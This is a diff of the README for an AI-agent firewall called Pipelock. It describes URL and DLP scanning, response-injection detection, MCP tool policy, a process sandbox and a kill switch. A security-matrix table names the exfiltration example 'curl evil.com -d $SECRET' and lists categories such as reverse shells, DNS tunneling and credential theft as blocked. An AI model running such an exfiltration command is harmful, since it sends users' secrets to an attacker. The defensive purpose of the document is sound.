@@ -76,31 +76,131 @@ gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner l
 
 Pipelock is an [agent firewall](https://pipelab.org/agent-firewall/): it sits inline between your AI agent and the internet, scanning outbound and inbound traffic.
 
-### Detect
+### 11-Layer URL Scanner
 
-- **11-layer URL scanner:** Scheme validation, CRLF/traversal blocking, domain blocklist, DLP, path entropy, subdomain entropy, SSRF/DNS-rebinding, rate limits, URL length, data budgets
-- **48 DLP patterns** with 6-pass normalization (base64, hex, URL-encoding, NFKC Unicode, leetspeak, vowel folding) and checksum validation (Luhn, IBAN, WIF)
-- **25 response injection patterns** covering jailbreaks, credential solicitation, memory persistence, covert actions, and CJK-language injection
-- **MCP tool poisoning + drift detection:** Full-schema recursive extraction catches CyberArk-style exfiltration in tool descriptions; rug-pull detection flags mid-session schema changes
-- **A2A protocol scanning:** Agent Card poisoning, card drift, session smuggling
-- **Cross-request exfiltration:** Per-session entropy budgets catch secrets split across multiple requests
-- **Canary tokens, denial-of-wallet detection, behavioral baseline, filesystem sentinel**
+Every request passes through: scheme validation, CRLF injection detection, path traversal blocking, domain blocklist, DLP pattern matching (48 built-in patterns for API keys, tokens, credentials, cryptocurrency keys, environment variable secrets, and financial identifiers with checksum validation), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.
 
-### Enforce
+DLP runs before DNS resolution, designed to catch secrets before any DNS query leaves the proxy. BIP-39 seed phrase detection uses a dedicated scanner with dictionary lookup, sliding window matching, and SHA-256 checksum validation to catch cryptocurrency mnemonic exfiltration across all transport surfaces.
 
-- **Process sandbox:** Landlock + seccomp + network namespaces on Linux, sandbox-exec on macOS. No Docker, no root required.
-- **Kill switch:** 4 independent sources (config, SIGUSR1, sentinel file, API). Any one active blocks all traffic. The API can run on a separate port (`api_listen`) so agents can't self-deactivate.
-- **MCP tool policy:** Pre-execution allow/deny/redirect rules on tool calls. Shell obfuscation detection built in.
-- **Adaptive enforcement:** Per-session threat scoring with automatic escalation. Actions tighten as suspicion accumulates, loosen after clean traffic.
-- **TLS interception:** Optional CONNECT tunnel MITM for full body/header/response scanning on encrypted traffic.
+See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.
 
-### Prove
+### Process Sandbox
 
-- **Security assessments** (`pipelock assess`): Attack simulation + config audit + deployment verification. Signed HTML reports with Ed25519 attestation.
-- **Flight recorder:** Hash-chained JSONL evidence log with signed checkpoints and DLP redaction.
-- **Compliance mappings:** OWASP MCP Top 10, OWASP Agentic Top 15, NIST 800-53, EU AI Act, SOC 2.
-- **Agent Bill of Materials:** CycloneDX 1.6 BOM with declared vs observed tool inventory.
-- **Session manifests, config scoring, signed reports.**
+Unprivileged process containment using OS-native kernel primitives. On Linux: Landlock LSM restricts filesystem access, seccomp filters dangerous syscalls, and network namespaces force all traffic through pipelock's scanner (no direct egress). On macOS: sandbox-exec profiles restrict filesystem and network. In containers, use `--best-effort` for Landlock + seccomp containment when namespace creation is restricted (network scanning uses proxy-based routing instead of kernel enforcement).
+
+```bash
+pipelock sandbox --config pipelock.yaml -- python agent.py
+pipelock sandbox --best-effort -- python agent.py  # containers
+pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
+```
+
+### Response Scanning
+
+Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 25 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, preference poisoning, covert action directives, model instruction boundaries, and CJK-language instruction overrides. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).
+
+### MCP Proxy
+
+Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.
+
+```bash
+# Wrap a local MCP server (stdio)
+pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp
+
+# Proxy a remote MCP server (HTTP)
+pipelock mcp proxy --upstream http://localhost:8080/mcp
+
+# Combined mode (fetch/forward proxy + MCP on separate ports)
+pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
+```
+
+### MCP Tool Policy
+
+Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 17 built-in rules covering destructive operations, credential access, reverse shells, persistence mechanisms, and encoded command execution. Shell obfuscation detection is built-in. v2.0 adds a `redirect` action that routes dangerous operations through audited wrappers instead of blocking outright.
+
+### Tool Call Chain Detection
+
+Detects attack patterns in sequences of MCP tool calls. Ships with 10 built-in patterns covering reconnaissance, credential theft, data staging, persistence, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.
+
+### Kill Switch
+
+Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.
+
+```bash
+# Activate from operator machine
+curl -X POST http://localhost:9090/api/v1/killswitch \
+  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
+```
+
+### Scan API
+
+Evaluation endpoint for programmatic scanning. Any tool, pipeline, or control plane can submit URLs, text, or tool calls and get a structured verdict back (the proxy doesn't need to be in the request path). Four scan kinds: `url`, `dlp`, `prompt_injection`, and `tool_call`. Returns findings with scanner type, rule ID, and severity. Bearer token auth, per-token rate limiting, and Prometheus metrics.
+
+See [docs/scan-api.md](docs/scan-api.md) for the full API reference.
+
+### Address Protection
+
+Detects blockchain address poisoning attacks where a lookalike address is substituted for a legitimate one. Validates addresses for ETH, BTC, SOL, and BNB chains, compares against a user-supplied allowlist, and flags similar addresses using prefix/suffix fingerprinting. Designed for agents that interact with DeFi protocols or execute transactions.
+
+### Filesystem Sentinel
+
+Monitors agent working directories for secrets written to disk. When an MCP subprocess writes a file containing credentials, pipelock detects it using the same DLP patterns applied to network traffic. On Linux, process lineage tracking attributes file writes to the agent's process tree. See [docs/guides/filesystem-sentinel.md](docs/guides/filesystem-sentinel.md).
+
+### Event Emission
+
+Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).
+
+See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.
+
+### Security Assessment
+
+`pipelock assess` runs a four-stage security assessment against your deployment: attack simulation (20 scenarios across DLP, injection, tool poisoning, and URL evasion), config audit (12 categories scored 0-100), deployment verification (live probe of scanning and containment), and MCP server discovery (protection status across Claude Code, Cursor, VS Code, and other clients).
+
+Critical exposures like unprotected MCP servers cap the grade regardless of numeric score.
+
+```bash
+pipelock assess init --config pipelock.yaml
+pipelock assess run assessment-a1b2c3d4/
+pipelock assess finalize assessment-a1b2c3d4/
+```
+
+The free summary shows your grade, section scores, and top findings. Licensed users get the full report with server-specific findings, remediation commands, and Ed25519-signed evidence.
+
+![Pipelock Security Summary showing grade C (79/100) with compliance coverage, MCP protection, and detection scoring](docs/assets/assess-summary.png)
+
+### Flight Recorder
+
+Hash-chained JSONL evidence log with Ed25519-signed checkpoints and DLP redaction. Every proxy decision is recorded as a tamper-evident entry linked to the previous one. Action receipts provide cryptographically signed proof of each mediated action (what happened, what the verdict was, which policy was active). Verify any receipt independently with `pipelock verify-receipt`.
+
+### Canary Tokens
+
+Synthetic secrets injected into the agent's environment. If pipelock detects a canary in outbound traffic, it proves the agent (or something in its chain) is exfiltrating environment variables. Ships with `pipelock canary` to generate config snippets.
+
+### More Features
+
+| Feature | What It Does |
+|---------|-------------|
+| **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
+| **Diagnose** | `pipelock diagnose` runs 7 local checks to verify your config works end-to-end (no network required) |
+| **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` trusts it system-wide. |
+| **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses |
+| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
+| **Config Scoring** (v2.0) | `pipelock audit score --config pipelock.yaml` evaluates security posture across 12 categories (0-100 with letter grade). Flags overpermissive tool policies. |
+| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
+| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
+| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
+| **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
+| **Adaptive Enforcement** | Per-session threat score with automatic escalation from warn to block, de-escalation timers, and domain burst detection |
+| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
+| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
+| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |
+| **A2A Scanning** | Agent Card poisoning detection, card drift monitoring, session smuggling prevention for Google's Agent-to-Agent protocol |
+| **Behavioral Baseline** | Profile-then-lock for MCP tool behavior. Learns normal patterns during a window, flags deviations after ratification. |
+| **Denial-of-Wallet** | Per-agent budgets for retries, fan-out, and concurrent tool calls. Catches loop storms and amplification attacks. |
+| **Compliance Mappings** | OWASP MCP Top 10, OWASP Agentic Top 15, NIST 800-53, EU AI Act, SOC 2 coverage documentation |
+
+![Pipelock Agent Egress Report showing risk rating, timeline, findings by category, and evidence appendix](examples/sample-report.png)
+
+![Pipelock Fleet Monitor: Grafana dashboard showing traffic, security events, and WebSocket metrics](docs/assets/fleet-dashboard.jpg)
 
 ## How It Works
 
@@ -161,6 +261,31 @@ flowchart LR
 
 </details>
 
+## Security Matrix
+
+Pipelock runs in three modes:
+
+| Mode | Security | Web Browsing | Use Case |
+|------|----------|--------------|----------|
+| **strict** | Allowlist-only | None | Regulated industries, high-security |
+| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
+| **audit** | Logging only | Unrestricted | Evaluation before enforcement |
+
+For agents running uncensored or abliterated models (e.g. OBLITERATUS), the [`hostile-model` preset](configs/hostile-model.yaml) layers additional defenses on top of strict mode: aggressive entropy thresholds (3.0), blanket network tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains (currently dependency-based detection).
+
+What each mode prevents, detects, or logs:
+
+| Attack Vector | Strict | Balanced | Audit |
+|---------------|--------|----------|-------|
+| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
+| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
+| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
+| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
+| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
+| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |
+
+> **Honest assessment:** Strict mode blocks all outbound HTTP except allowlisted API domains, so there's no exfiltration channel through the proxy. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`), pipelock adds OS-level containment (Landlock + network namespaces + seccomp) on top of content inspection. The agent can't bypass the proxy because it has no direct network access.
+
 ## Configuration
 
 Generate a config from one of three CLI presets, or let `pipelock audit` tailor one to your project:
@@ -198,8 +323,8 @@ For false positive tuning: **[docs/false-positive-tuning.md](docs/false-positive
 - **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
 - **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
 - **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
-- **[JetBrains/Junie](docs/guides/jetbrains.md):** MCP proxy wrapping for IntelliJ, PyCharm, GoLand
-- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md)
+- **[JetBrains/Junie](docs/guides/jetbrains.md):** MCP proxy wrapping for IntelliJ, PyCharm, GoLand ([walkthrough](https://pipelab.org/learn/jetbrains-integration/))
+- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md) ([walkthrough](https://pipelab.org/learn/cursor-integration/))
 - **[OpenClaw](docs/guides/openclaw.md):** Gateway sidecar, init container, config wrapping
 
 ## Deployment
@@ -260,6 +385,28 @@ See [docs/rules.md](docs/rules.md) for details.
 
 Full comparison: [docs/comparison.md](docs/comparison.md)
 
+Side-by-side breakdowns: [pipelab.org/compare](https://pipelab.org/compare/)
+
+<details>
+<summary>OWASP Agentic Top 10 Coverage</summary>
+
+| Threat | Coverage |
+|--------|----------|
+| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
+| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
+| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
+| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
+| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
+| ASI06 Memory & Context Poisoning | **Moderate:** injection detection on fetched content |
+| ASI07 Insecure Inter-Agent Communication | **Partial:** agent ID, integrity, signing |
+| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
+| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
+| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |
+
+Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)
+
+</details>
+
 ## Docs
 
 | Document | What's In It |
@@ -318,7 +465,7 @@ Pipelock is tested like a security product. The open-source core has thousands o
 | CI matrix | Go 1.25 + 1.26, CodeQL, golangci-lint |
 | Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |
 
-Run `make test` to verify locally. Independent benchmark: [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) (143 attack cases across 16 categories).
+Run `make test` to verify locally. Independent benchmark: [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) (143 attack cases across 16 categories). [Live results](https://pipelab.org/gauntlet/).
 
 ## Credits
 
